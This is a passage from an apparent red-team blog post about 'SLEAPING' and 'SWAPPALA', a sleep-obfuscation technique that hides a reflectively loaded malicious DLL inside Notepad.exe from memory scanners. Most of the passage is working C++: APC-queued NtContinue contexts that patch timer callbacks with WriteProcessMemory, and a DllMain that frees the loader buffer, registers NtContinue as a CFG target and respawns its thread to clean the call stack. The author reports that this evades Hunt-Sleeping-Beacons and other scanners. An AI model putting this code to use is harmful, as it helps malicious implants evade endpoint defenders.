    Ctx<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>

    <span class="token comment">/* queue up apc calls */</span>
    <span class="token comment">//always the same thread is queued but with a different context</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtQueueApcThread</span><span class="token punctuation">(</span>Thread<span class="token punctuation">,</span> <span class="token punctuation">(</span>PPS_APC_ROUTINE<span class="token punctuation">)</span>NtContinueAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Ctx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtAlertResumeThread</span><span class="token punctuation">(</span>Thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*---------------------------------*/</span>

    <span class="token comment">/*-----------FIXING THREADS-------------*/</span>

    <span class="token comment">//first thread just waiting for the event to be set</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    <span class="token comment">/* wait til EvntSync gets triggered */</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtWaitForSingleObjectAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>EvntFix<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    
    <span class="token comment">//sleep for sleep timer</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>Sleep<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">17000</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ResumeThreadValue<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ResumeThreadValue<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ResumeThreadValue<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ResumeThreadValue<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CtxFix<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>ResumeThreadValue<span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    CtxFix<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ExitThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
    CtxFix<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token number">0x00</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtQueueApcThread</span><span class="token punctuation">(</span>ThreadFix<span class="token punctuation">,</span> <span class="token punctuation">(</span>PPS_APC_ROUTINE<span class="token punctuation">)</span>NtContinueAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>CtxFix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtAlertResumeThread</span><span class="token punctuation">(</span>ThreadFix<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*-----------------------------------------*/</span>

    apcThreads<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> Thread<span class="token punctuation">;</span>
    apcThreads<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> ThreadFix<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>And that‚Äôs about it, just waiting for the bomb to stop ticking üòÑ</p><h2 id="the-result">The Result</h2><p>Finally the screenshots paragraph:</p><img src="https://oldboy21.github.io/timerspoof/image%201.png" class="center"><p>SLEAPING and SWAPPALA also resisting to some other scanners:</p><img src="https://oldboy21.github.io/timerspoof/image%202.png" class="center">
<img src="https://oldboy21.github.io/timerspoof/image%203.png" class="center"><h2 id="but-wait-you-said">But Wait You Said</h2><p>Yes, I did mention before that HSB was actually alerting ‚Äúa thing or two‚Äù when it comes to SLEAPING and SWAPPALA.</p><img src="https://oldboy21.github.io/timerspoof/image%204.png" class="center"><p>So besides the suspicious timer alert that at this point of the blog can be ignored, HSB was also detecting some ‚ÄúAbnormal page in callstack: Callstack to blocking function contains NON-executable memory page‚Äù. That came across as a surprise to be honest the first time, because since the nature of SWAPPALA is to re-map a legit DLL at the same address of the malcious mapping (and vice versa) the callstack should not contain reference to NON-executable memory page.</p><p>After some testing I realized what that was exactly, so the address present in the callstack triggering the HSB checks is a return address pointing to memory that was allocated the first time the DLL was actually written within Notepad.exe, before the Reflective Loading happens basically.</p><p>I haven‚Äôt tested this too deeply but, despite I was freeing the first allocation after the Reflective DLL was loaded, that memory page was re-used by Notepad.exe process and allocated again as RW page. Being the main thread of the Reflective DLL being ran from the ReflectiveLoader function the callstack was looking pretty much like this:</p><img src="https://oldboy21.github.io/timerspoof/image%205.png" class="center"><p>And HSB was pretty pissed about it. So the way around this that SWAPPALA has found is:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//core routine of SWAPPALA and SLEAPING</span>
VOID <span class="token function">CoreFunction</span><span class="token punctuation">(</span>LPVOID lpParam<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    PCORE_ARGUMENTS CoreArguments <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    CoreArguments <span class="token operator">=</span> <span class="token punctuation">(</span>PCORE_ARGUMENTS<span class="token punctuation">)</span>lpParam<span class="token punctuation">;</span>

    <span class="token comment">//looping and Sleaping &lt;3</span>
    <span class="token keyword">do</span> <span class="token punctuation">{</span>
        <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Sleaping"</span><span class="token punctuation">,</span> <span class="token string">"Swappala"</span><span class="token punctuation">,</span> MB_OK <span class="token operator">|</span> MB_ICONINFORMATION<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Sleaping</span><span class="token punctuation">(</span>CoreArguments<span class="token operator">-&gt;</span>myBase<span class="token punctuation">,</span> CoreArguments<span class="token operator">-&gt;</span>sacDLLHandle<span class="token punctuation">,</span> CoreArguments<span class="token operator">-&gt;</span>malDLLHandle<span class="token punctuation">,</span> CoreArguments<span class="token operator">-&gt;</span>viewSize<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//nightmares</span>
            <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Sleaping"</span><span class="token punctuation">,</span> <span class="token string">"With Nightmares"</span><span class="token punctuation">,</span> MB_OK <span class="token operator">|</span> MB_ICONINFORMATION<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span> HMODULE hModule<span class="token punctuation">,</span>
                       DWORD  ul_reason_for_call<span class="token punctuation">,</span>
                       LPVOID lpReserved
                     <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
    <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
    <span class="token punctuation">{</span>
       
        PBYTE oldMemory <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        
        <span class="token comment">//even if unampped it's in the PEB</span>
        PBYTE myBase <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"SRH.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//get handle to NTDLL</span>
        HMODULE hNtdll <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//retrieve the information left from the reflective loader</span>
        <span class="token comment">//retrieve handle of sac dll</span>
        PHANDLE pointerToHandle <span class="token operator">=</span> <span class="token punctuation">(</span>PHANDLE<span class="token punctuation">)</span>myBase<span class="token punctuation">;</span>
        HANDLE sacDllHandle <span class="token operator">=</span> <span class="token operator">*</span>pointerToHandle<span class="token punctuation">;</span>
        
        <span class="token comment">//retrieve handle of mal dll</span>
        pointerToHandle<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//+8 bytes</span>
        HANDLE malDllHandle <span class="token operator">=</span> <span class="token operator">*</span>pointerToHandle<span class="token punctuation">;</span>
        
        <span class="token comment">//retrieve size of dll in memory</span>
        pointerToHandle<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//+8 bytes</span>
        PSIZE_T pointerToSize <span class="token operator">=</span> <span class="token punctuation">(</span>PSIZE_T<span class="token punctuation">)</span>pointerToHandle<span class="token punctuation">;</span>
        SIZE_T viewSize <span class="token operator">=</span> <span class="token operator">*</span>pointerToSize<span class="token punctuation">;</span>
        
        <span class="token comment">//retrieve the first buffer address</span>
        pointerToHandle<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//+8 bytes</span>
        oldMemory <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span> <span class="token operator">*</span>pointerToHandle<span class="token punctuation">;</span>

        <span class="token comment">//remove the very first buffer allocated for the reflective DLL</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">VirtualFree</span><span class="token punctuation">(</span>oldMemory<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    
            <span class="token comment">//error releasing old buffer</span>
            <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//adding NtContinue to valid target as the new SleapingAPC implementation</span>
        <span class="token function">CfgAddressAdd</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>hNtdll<span class="token punctuation">,</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hNtdll<span class="token punctuation">,</span> <span class="token string">"NtContinue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        PCORE_ARGUMENTS CoreArguments <span class="token operator">=</span> <span class="token punctuation">(</span>PCORE_ARGUMENTS<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CORE_ARGUMENTS<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        CoreArguments<span class="token operator">-&gt;</span>myBase <span class="token operator">=</span> myBase<span class="token punctuation">;</span>
        CoreArguments<span class="token operator">-&gt;</span>sacDLLHandle <span class="token operator">=</span> sacDllHandle<span class="token punctuation">;</span>
        CoreArguments<span class="token operator">-&gt;</span>malDLLHandle <span class="token operator">=</span> malDllHandle<span class="token punctuation">;</span>
        CoreArguments<span class="token operator">-&gt;</span>viewSize <span class="token operator">=</span> viewSize<span class="token punctuation">;</span>
        <span class="token comment">//creating a new thread in the address space of SRH.dll </span>
        HANDLE hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>CoreFunction<span class="token punctuation">,</span> CoreArguments<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//killing the thread coming from the Reflective Loader</span>
            <span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        
    <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>As mentioned in the comment, I have fixed that by creating a new thread in the address space of SRH.dll (my sacrificial DLL) and exiting the thread coming from the Reflective Loader context, in fact cleaning the stack and get rid of that IOC as well.</p><p>It‚Äôs important to mention that other sleeping masks achieve this spoofing the stack of the main thread at sleep time, however that it‚Äôs not necessary in the case of SWAPPALA.</p><h2 id="conclusions-and-credits">Conclusions and Credits</h2><p>It was fun as always, maybe bit overengineered but efficient, I will keep working on this to find a way to improve. I will also take some time before merging this branch but feel free to reach out in case you have questions or doubts.</p><p>I have mentioned this quite extensively already, but big shout out and thanks to authors of code from:</p><ul><li><a href="https://github.com/thefLink/Hunt-Sleeping-Beacons">https://github.com/thefLink/Hunt-Sleeping-Beacons</a></li><li><a href="https://maldevacademy.com/">https://maldevacademy.com/</a></li><li><a href="https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools/attacking-timer-queues">https://urien.gitbook.io/diago-lima/a-deep-dive-into-exploiting-windows-thread-pools/attacking-timer-queues</a></li></ul></div></article><hr><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://oldboy21.github.io/tags/untagged/">untagged</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 